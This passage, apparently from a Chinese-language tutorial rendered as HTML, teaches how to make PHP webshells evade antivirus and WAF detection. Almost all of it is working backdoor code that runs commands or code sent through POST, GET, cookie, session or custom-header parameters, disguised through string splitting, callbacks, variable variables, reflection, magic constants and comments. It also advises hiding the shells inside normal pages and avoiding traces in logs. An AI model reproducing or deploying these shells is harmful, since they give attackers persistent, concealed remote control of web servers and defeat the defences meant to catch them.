+</h6><pre tabindex="0"><code>&lt;?php $k=&#34;e&#34;.&#34;v&#34;.&#34;a&#34;.&#34;l&#34;; $k(${&#34;_PO&#34;.&#34;ST&#34;} [&#39;110&#39;]);?&gt;</code></pre><p>我们可以将敏感函数拆分，然后做一个简单的敏感函数免杀！其次也可以使用下面的arry数组结构函数进行免杀。</p>
+<pre tabindex="0"><code>&lt;?php
+$a = substr_replace(&#34;xxser&#34;,&#34;asser&#34;,-3);
+$b = array(&#39;&#39;,$a);
+$c = $b[1].chr(&#39;116&#39;);
+$fun=preg_replace(&#34;/xx/&#34;,&#34;&#34;,$c);
+$d = substr_replace(&#34;&#34;,$fun,0);
+$d ($_POST[&#39;110&#39;]);
+?&gt;
+
+&lt;?php
+$func = $_GET[&#34;func&#34;];
+$a = &#34;a&#34;;
+$s = &#34;s&#34;;
+$c=$a.$s.$_GET[&#34;func2&#34;];
+$c($func);
+?&gt;</code></pre><h6 id="混淆" class="heading-element"><span>0.0.0.1.5  混淆</span>
+  <a href="#%e6%b7%b7%e6%b7%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><pre tabindex="0"><code>&lt;?php 
+function a() 
+{ 
+return &#34;/*110110110110*/&#34;.$_POST[&#39;110&#39;].&#34;/*110110110110**/&#34;; 
+} 
+@eval(a()); 
+?&gt;</code></pre><p>单纯的字符串变化直接被杀的死死的，因此我们还需要配合其他无用字符去混淆视听，进而增强免杀效果！</p>
+<pre tabindex="0"><code>&lt;?php $a = str_replace(x,&#34;&#34;,&#34;xexaxvxlx&#34;); $a(@$_POST[&#34;110&#34;]); ?&gt;</code></pre><p>为了避免被检测到，可以参考文件上传的原理（重点是想办法造成溢出），这样的后果就是文件变大，不过适合搭配图片马使用。</p>
+<h6 id="函数特征" class="heading-element"><span>0.0.0.1.6  函数特征</span>
+  <a href="#%e5%87%bd%e6%95%b0%e7%89%b9%e5%be%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### 函数替换</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">array_map</span>()<span style="color:#58a1dd">：函数基本上是将数组的每个元素发送到用户自定义的函数中进行修改或处理，然后返回一个具有该函数修改后新值的数组。</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">array_filter</span>()<span style="color:#58a1dd">：通过函数过滤掉数组中的元素</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">array_reduce</span>()<span style="color:#58a1dd">：发送数组中的值到用户自定义函数，并返回一个字符串</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">array_diff_uassoc</span>()<span style="color:#58a1dd">：比较两个数组的键名和键值（使用用户自定义函数比较键名），并返回差集</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">array_udiff</span>()<span style="color:#58a1dd">：比较两个数组的键值（使用用户自定义函数比较键值），并返回差集</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">array_udiff_uassoc</span>()<span style="color:#58a1dd">：通过使用自定义函数比较键和值，计算数组的差集</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">array_intersect_assoc</span>()<span style="color:#58a1dd">：比较两个数组的键名和键值，并返回交集</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">array_uintersect</span>()<span style="color:#58a1dd">：比较两个数组的键值（使用用户自定义函数比较键值），并返回交集</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">array_uintersect_uassoc</span>()<span style="color:#58a1dd">：比较两个数组的键名和键值（使用用户自定义函数进行比较），并返回交集</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">xml_set_character_data_handler</span>()<span style="color:#58a1dd">：该函数规定当解析器在</span> <span style="color:#58a1dd">XML</span> <span style="color:#58a1dd">文件中找到字符数据时所调用的函数。如果处理器被成功的建立，该函数将返回</span> <span style="color:#ff636f">true</span><span style="color:#58a1dd">；否则返回</span> <span style="color:#ff636f">false</span><span style="color:#58a1dd">。</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">xml_set_default_handler</span>()<span style="color:#ff636f">:</span><span style="color:#58a1dd">函数为</span> <span style="color:#58a1dd">XML</span> <span style="color:#58a1dd">解析器建立默认的数据处理器。该函数规定在只要解析器在</span> <span style="color:#58a1dd">XML</span> <span style="color:#58a1dd">文件中找到数据时都会调用的函数。如果成功，该函数则返回</span> <span style="color:#ff636f">TRUE</span><span style="color:#58a1dd">。如果失败，则返回</span> <span style="color:#ff636f">FALSE</span><span style="color:#58a1dd">。</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">xml_set_external_entity_ref_handler</span>()<span style="color:#ff636f">:</span><span style="color:#58a1dd">函数规定当解析器在</span> <span style="color:#58a1dd">XML</span> <span style="color:#58a1dd">文档中找到外部实体时被调用的函数。如果成功，该函数则返回</span> <span style="color:#ff636f">TRUE</span><span style="color:#58a1dd">。如果失败，则返回</span> <span style="color:#ff636f">FALSE</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">xml_set_notation_decl_handler</span>()<span style="color:#ff636f">:</span><span style="color:#58a1dd">函数规定当解析器在</span> <span style="color:#58a1dd">XML</span> <span style="color:#58a1dd">文档中找到符号声明时被调用的函数。</span></span></span></code></pre></div><p>如果成功，该函数则返回 TRUE。如果失败，则返回 FALSE。</p>
+<p>xml_set_unparsed_entity_decl_handler():函数规定在遇到无法解析的实体名称（NDATA）声明时被调用的函数。如果处理器被成功的建立，该函数将返回 true；否则返回 false。</p>
+<p>尽量去PHP语法手册，找一些及其偏门的函数&hellip;&hellip;..</p>
+<p>####### 自定义函数绕过</p>
+<p>（可搭配大小写）</p>
+<p>我们可以通过我们自定义的函数方式，搭配php的版本和可替换函数绕过WAF的拦截，达到免杀的目的！由于在PHP函数中函数名、方法名、类名 不区分大小写，但推荐使用与定义时相同的名字的时候还可以使得大小写进行绕过，所以大大提升了免杀效果！</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span> 
+</span></span><span style="display:flex;"><span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">aaa</span>(<span style="color:#58a1dd">$a</span>){
+</span></span><span style="display:flex;"><span>     <span style="color:#ff636f">return</span> <span style="color:#58a1dd">$a</span>;
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">bbb</span>(<span style="color:#58a1dd">$b</span>){
+</span></span><span style="display:flex;"><span>     <span style="color:#ff636f">return</span> <span style="color:#ff636f">eval</span>(<span style="color:#58a1dd">$b</span>);
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">post</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">return</span> <span style="color:#ff636f">@</span><span style="color:#58a1dd">$_POST</span>[<span style="color:#a6be9d">&#39;110&#39;</span>];
+</span></span><span style="display:flex;"><span>}    
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">function</span> <span style="color:#58a1dd">run</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">return</span> <span style="color:#58a1dd">aaa</span>(<span style="color:#58a1dd">bbb</span>)(<span style="color:#58a1dd">aaa</span>(<span style="color:#58a1dd">post</span>)());
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">aaa</span>(<span style="color:#58a1dd">bbb</span>)(<span style="color:#58a1dd">aaa</span>(<span style="color:#58a1dd">post</span>)());
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
+</span></span></code></pre></div><p>####### 变形回调</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">array_walk</span>()  
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">array_map</span>()
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">filter_var</span>() 
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">filter_var_array</span>() 
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">uasort</span>() 
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">uksort</span>() 
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">以上是常见的可待替代函数，但是大部分都被杀的死死的，所以需要混淆才可以使用</span></span></span></code></pre></div><p>####### 数组</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$a</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">substr_replace</span>(<span style="color:#a6be9d">&#34;evxx&#34;</span>,<span style="color:#a6be9d">&#34;al&#34;</span>,<span style="color:#a6be9d">2</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$b</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">array</span>(<span style="color:#58a1dd">$arrayName</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">$arrayName</span> <span style="color:#ff636f">=</span>(<span style="color:#58a1dd">$arrayName</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">array</span>(<span style="color:#a6be9d">&#39;a&#39;</span> <span style="color:#ff636f">=&gt;</span> <span style="color:#58a1dd">$b</span>(<span style="color:#58a1dd">$_POST</span>[<span style="color:#a6be9d">&#39;110&#39;</span>])))));
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
+</span></span></code></pre></div><p>####### 可变变量</p>
+<p>PHP中有一种变量叫做可变变量，这种变量不是一种基础类型的变量。可变变量是指一个普通变量的值可以作为另一个变量的名称被使用。这句话听起来有些抽象。我们可以通过实例来展示可变变量的定义以及实用。</p>
+<p>这个时候我们就可以使用一些多次加密的手段，把<code>eval函数</code>进行一个多次加密，已达到完全免杀的结果</p>
+<pre tabindex="0"><code>&lt;?php 
+$zeo=&#39;miansha&#39;;
+$$zeo=$_POST[&#39;110&#39;];
+eval($miansha);
+?&gt;</code></pre><p>####### 类</p>
+<p>类现在是大多数人的常用选择之一，因为类这个方法在过D盾检测的时候效率较高；但是用类自然就少不了魔法函数，我们简单构造一个类的免杀马如下：</p>
+<pre tabindex="0"><code>&lt;?php 
+ class zeo2
+ {
+   public $b =&#39;&#39;;
+   function post(){
+     return $_POST[&#39;x&#39;];
+   }
+ }
+class zeo extends zeo2
+{
+  public $code=null;
+  function __construct(){
+          $code=parent::post();
+    assert($code);
+}
+}
+$blll = new zeo;
+$bzzz = new zeo2;
+?&gt;</code></pre><h6 id="版本特性" class="heading-element"><span>0.0.0.1.7  版本特性</span>
+  <a href="#%e7%89%88%e6%9c%ac%e7%89%b9%e6%80%a7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>传统的php免杀无非就是各种变形和外部参数获取，对于一些先进的waf和防火墙来说，不论如何解析最终都会到达命令执行的地方，但是如果语法报错的话，就可能导致解析失败了，这里简单说几个利用php版本来进行语义出错的php命令执行方式。</p>
+<p>####### 利用特殊符号来引起报错</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span> <span style="color:#58a1dd">\echo</span> <span style="color:#a6be9d">&#39;whoami&#39;</span>; <span style="color:#828b96;font-style:italic">?&gt;</span>
+</span></span></code></pre></div><p>PHP版本：只限于5.2版本</p>
+<p>它的要求是能干扰到杀软的正则判断，还要代码能执行。这个可以自己慢慢测试。具体就是利用各种==回车、换行、null和空白字符==，这里我们尝试改造为可连接的一句话木马，配合上面的可变变量</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span> 
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$xxxxxxxxxxxxxx</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;miansha&#39;</span>; 
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$$xxxxxxxxxxxxxx</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$_POST</span>[<span style="color:#a6be9d">&#39;110&#39;</span>]; 
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">eval</span>(<span style="color:#a6be9d">``</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$miansha</span>); 
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
+</span></span></code></pre></div><p>####### 十六进制字符串</p>
+<p>PHP版本：只限于5.3和5.5版本；在php7中不认为是数字，php5则依旧为数字。（友情提示： 5.X可以成功执行命令，php7无法执行）</p>
+<pre tabindex="0"><code>&lt;?php $s=substr(&#34;aabbccsystem&#34;,&#34;0x6&#34;); $s(whoami) ?&gt;</code></pre><p>可以结合垃圾数据，变形混淆，以及大量特殊字符和注释的方式来构造更多的payload,毕竟每家的waf规则不同，配置也不同，与一些传输层面的bypass进行结合产生的可能性就会非常多样</p>
+<p>####### 利用在语法不换行来执行命令</p>
+<p>PHP版本：只限于7.3.4版本，如果是其他的版本就会报错，所以针对性较强！</p>
+<pre tabindex="0"><code>&lt;?php
+$a = $_GET[&#39;function&#39;] ?? &#39;whoami&#39;;
+$b = $_GET[&#39;cmd&#39;] ?? &#39;whoami&#39;;
+$a(null.(null.$b));
+?&gt;</code></pre><p><strong>小提示</strong>：7.0版本的??特性，如果版本为5.x的话就会报错</p>
+<h6 id="传参方式" class="heading-element"><span>0.0.0.1.8  传参方式</span>
+  <a href="#%e4%bc%a0%e5%8f%82%e6%96%b9%e5%bc%8f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>在很多情况下，以请求头作为参数传递并非waf和人工排查的重中之重且非常误导和隐藏，下面就是常用的几种方式</p>
+<p>####### Cookie</p>
+<p>由于Cookie基本上是每个web应用都需要使用到的，php应用在默认情况下，在Cookies请求头中会存在一个PHPSESSID=xxxx这样的cookie，其实这个就可以成为我们的传参位置</p>
+<pre tabindex="0"><code>&lt;?php
+session_start();
+$a = &#34;a&#34;;
+$s = &#34;s&#34;;
+$c=$a.$s.&#34;sert&#34;;
+
+$c(base64_decode($_COOKIE[&#34;PHPSESSID&#34;]));
+
+?&gt;</code></pre><p>如果不仔细排查是不容易发现的，由于webshell的session和网站本身业务并没有关系，所以这个PHPSESSID可以随意修改</p>
+<p>####### Session</p>
+<p>session的传参方式其实算是一种间接传产方式，由于session的内容是需要通过源码设置的，并不能想cookie一样直接在请求头中修改，因此需要准备两个文件，一个是将输入的参数传入session，另一个就是将session中的内容取出并执行命令</p>
+<p>这里依旧沿用上面的cookie传参</p>
+<p>给session传入参数</p>
+<pre tabindex="0"><code>&lt;?php
+session_start();
+$_SESSION[&#39;dmeo&#39;]=base64_decode($_COOKIE[&#34;PHPSESSID&#34;]);
+
+?&gt;</code></pre><p>取出session内容并执行，其实下面的代码是可以直接插入到正常页面中的，增加迷惑性，因为一般正常页面返回的html代码是比较多的，如果我们将内容回显到正常页面当中是比较难发现的</p>
+<pre tabindex="0"><code>&lt;?php
+session_start();
+$a = &#34;a&#34;;
+$s = &#34;s&#34;;
+$c=$a.$s.&#34;sert&#34;;
+$c($_SESSION[&#39;dmeo&#39;]);
+
+?&gt;</code></pre><p>在test.php下通过cookie添加session，注意这个PHPSESSID的值其实就是一个session文件，每当有一个新的sessionid都会生成一个新的session文件，因此这个文件名我们是可以随意修改的，在这里的sessionid不但是文件名，而且也是我们的base64加密后的命令</p>
+<p>####### 自定义头（好用）</p>
+<p>自定义请求头其实也是作为一种伪装的请求方式，你可以选择完全自定义一个请求头进行参数传递，但是很多waf也会检测一些没出现过的请求头容易被识别出来，且一旦在日志中被找到一个以这种方式传参，很容易就能查找到使用数据包，还是不稳当，与cookie相比，cookie本身就是一堆随机数不好区分</p>
+<pre tabindex="0"><code>&lt;?php
+session_start();
+$a = &#34;a&#34;;
+$s = &#34;s&#34;;
+$c=$a.$s.&#34;sert&#34;;
+$c(getallheaders()[&#39;Demo&#39;]);
+
+?&gt;</code></pre><p>####### php伪协议</p>
+<pre tabindex="0"><code>&lt;?php
+$q=$_GET[1];
+file_get_contents(&#34;php&#34;.$q)($_GET[2]);</code></pre><h6 id="特征绕过" class="heading-element"><span>0.0.0.1.9  特征绕过</span>
+  <a href="#%e7%89%b9%e5%be%81%e7%bb%95%e8%bf%87" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>waf毕竟还是通过特征判断的，只有知道了，waf匹配的正则表达式大概是什么样的，webshell的免杀有真正的意义</p>
+<p>####### 数据特征绕过</p>
+<p>######## 1.    $_xxx[xxx]     绕过</p>
+<p>看这个特征可以发现很明显的是一个获取参数的语句，但为什么我会将起列举出来了，因为在很多情况下，现在的web应用大多都是使用的框架，基本上所有的获取请求参数内容的方法都是经过框架封装过的，最原始的获取参数内容的方式已经非常少见了，很容易通过一些命令如linux下的find命令通过正则表达式即可找到对应的webshell，很容易被发现，因此不使用该特征是很有必要的</p>
+<p>######### {}</p>
+<ul>
+<li>使用{}来替代[]是在ctf中十分常见的绕过方式</li>
+</ul>
+<pre tabindex="0"><code>&lt;?php
+
+echo $_GET{&#34;demo&#34;};</code></pre><p>#########  foreach</p>
+<ul>
+<li>foreach语句</li>
+</ul>
+<p>利用复合变量加foreach，获取参数中的内容，其特点并没有[],不容易被识别</p>
+<pre tabindex="0"><code>&lt;?php
+$a = &#34;a&#34;;
+$s = &#34;s&#34;;
+$c=$a.$s.&#34;sert&#34;;
+foreach (array(&#39;_GET&#39;) as $r){
+    foreach ($$r as $k =&gt;$v){
+        $c($v);
+
+    }
+}</code></pre><p>######### 自定义请求头</p>
+<p>使用自定义的请求头同样是没有上面的特征</p>
+<pre tabindex="0"><code>&lt;?php
+$a = &#34;a&#34;;
+$s = &#34;s&#34;;
+$c=$a.$s.&#34;sert&#34;;
+$c(getallheaders()[&#39;Demo&#39;]);
+&gt;</code></pre><p>######## 2. $xxx($xxx) 绕过</p>
+<p>这个特征大致就是某盾，某狗等的正则表达式匹配的内容，只要去消除此特征即可免杀</p>
+<p>#########  &ldquo;&ldquo;特性</p>
+<p>该原理就是&quot;&ldquo;中的变量不会被当做字符串使用,会被解析，经过测试该方法基本失效</p>
+<pre tabindex="0"><code>&lt;?php
+$a = &#34;a&#34;;
+$s = &#34;s&#34;;
+$c=$a.$s.&#34;sert&#34;;
+$f = $_POST[1]
+$c(&#34;$f&#34;);
+&gt;</code></pre><p>######### 回调函数</p>
+<pre tabindex="0"><code>&lt;?php
+function  demo()
+{
+    return $_GET[&#34;a&#34;];
+}
+
+demo()($_GET[&#34;b&#34;]);</code></pre><p>######### 魔术常量</p>
+<p>可以用到的4种魔术常量</p>
+<pre tabindex="0"><code>__FILE__：返回当前文件的绝对路径(包含文件名)。
+
+__FUNCTION__：返回当前函数(或方法)的名称。
+
+__CLASS__：返回当前的类名(包括该类的作用区域或命名空间)。
+
+__NAMESPACE__：返回当前文件的命名空间的名称。</code></pre><p>示例</p>
+<p>__FILE__的利用,将webshell的名字改为base64编码后的内容</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">base64_decode</span>(<span style="color:#58a1dd">basename</span>(<span style="color:#58a1dd">__FILE__</span>,<span style="color:#a6be9d">&#34;.php&#34;</span>))(<span style="color:#58a1dd">$_POST</span>[<span style="color:#a6be9d">1</span>]);</span></span></code></pre></div><p>__FUNCTION__的利用,将webshell的名字改为base64编码后的内容</p>
+<pre tabindex="0"><code>&lt;?php
+
+function assert2(){
+    substr(__FUNCTION__,0,6)($_GET[1]);
+}
+assert2();</code></pre><p>__CLASS__的利用</p>
+<pre tabindex="0"><code>&lt;?php
+
+class assert2{
+    static function demo(){
+        substr(__CLASS__,0,6)($_GET[1]);
+    }
+}
+assert2::demo();</code></pre><p>__NAMESPACE__的利用</p>
+<pre tabindex="0"><code>&lt;?php
+
+namespace assert2;
+substr(__NAMESPACE__,0,6)($_GET[1]);</code></pre><p>######### 自定义常量</p>
+<pre tabindex="0"><code>&lt;?php
+define(&#34;DEMO&#34;,$_GET[1].&#34;ert&#34;);
+substr(DEMO,0)($_GET[2]);</code></pre><p>######### 分离免杀</p>
+<p>顾名思义，就是将一个马拆分成两部分，及使用file_get_contents()将内容读取出来，为什么不使用include等这些文件包含函数了？因为webshell的免杀在于动态函数的调用，最终还是要拼接在一起，绕过的原则其实就是绕过waf的正则表达式，如果直接include其实和写在一个文件里没啥区别</p>
+<pre tabindex="0"><code>&lt;?php
+file_get_contents(&#34;test.txt&#34;)($_GET[1]);</code></pre><p>######### 注释及空白符混淆</p>
+<p>这种方式和sql注入差不多，原理就是php允许在括号中添加注释符和空白符并不会影响代码正常运行</p>
+<pre tabindex="0"><code>&lt;?php
+$func = $_GET[&#34;func&#34;];
+$a = &#34;a&#34;;
+$s = &#34;s&#34;;
+$c=$a.$s.$_GET[&#34;func2&#34;];
+$c(//);//(
+    $func//);//);
+)
+?&gt;</code></pre><p>######### 反射调用</p>
+<p>反射类及反射类方法</p>
+<pre tabindex="0"><code>&lt;?php
+    $class          = new \ReflectionClass(&#39;Site\\Website&#39;);  // 以类名 Website 作为参数，即可创建 Website 类的反射类
+    $properties     = $class-&gt;getProperties();      // 以数组的形式返回 Website 类的所有属性
+    $property       = $class-&gt;getProperty(&#39;name&#39;);  // 获取 Website 类的 name 属性
+    $methods        = $class-&gt;getMethods();         // 以数组的形式返回 Website 类的所有方法
+    $method         = $class-&gt;getMethod(&#39;getName&#39;); // 获取 Website 类的 getName 方法
+    $constants      = $class-&gt;getConstants();       // 以数组的形式获取所有常量
+    $constant       = $class-&gt;getConstant(&#39;TITLE&#39;); // 获取 TITLE 常量
+    $namespace      = $class-&gt;getNamespaceName();   // 获取类的命名空间
+    $comment_class  = $class-&gt;getDocComment();      // 获取 Website 类的注释文档，即定义在类之前的注释
+    $comment_method = $class-&gt;getMethod(&#39;getUrl&#39;)-&gt;getDocComment();  // 获取 Website 类中 getUrl 方法的注释文档
+?&gt;</code></pre><p>通过属性名免杀</p>
+<pre tabindex="0"><code>&lt;?php
+class a{
+    public $assert2;
+}
+
+$class = new ReflectionClass(new a());
+substr($class-&gt;getProperties()[0]-&gt;name,0,6)($_GET[1]);</code></pre><p>通过注释免杀</p>
+<pre tabindex="0"><code>&lt;?php
+/**
+ *phpinfo*/
+class A
+{
+    public static function B()
+    {
+        return $_POST[1];
+    }
+}
+
+$re = new ReflectionClass(new A());
+$a = str_ireplace(&#34; &#34;,&#34;&#34;,str_ireplace(&#34;\n&#34;,&#34;&#34;,str_ireplace(&#34;/&#34;,&#34;&#34;,str_ireplace(&#34;*&#34;,&#34;&#34;,$re-&gt;getDocComment()))));
+
+substr($a,1)(A::B());</code></pre><p>######### 类调用</p>
+<p>类方法调用</p>
+<pre tabindex="0"><code>&lt;?php
+class a{
+    function demo(){
+        $a = &#34;a&#34;;
+        $s = &#34;s&#34;;
+        $c=$a.$s.&#34;sert&#34;;
+        return $c;
+    }
+}
+
+$s = new a();
+$s-&gt;demo()($_GET[1]);</code></pre><p>类的静态方法</p>
+<pre tabindex="0"><code>&lt;?php
+class a{
+    static function demo(){
+        $a = &#34;a&#34;;
+        $s = &#34;s&#34;;
+        $c=$a.$s.&#34;sert&#34;;
+        return $c;
+    }
+}
+
+a::demo()($_GET[1]);</code></pre><h6 id="扩展免杀" class="heading-element"><span>0.0.0.1.10  扩展免杀</span>
+  <a href="#%e6%89%a9%e5%b1%95%e5%85%8d%e6%9d%80" class="heading-mark">
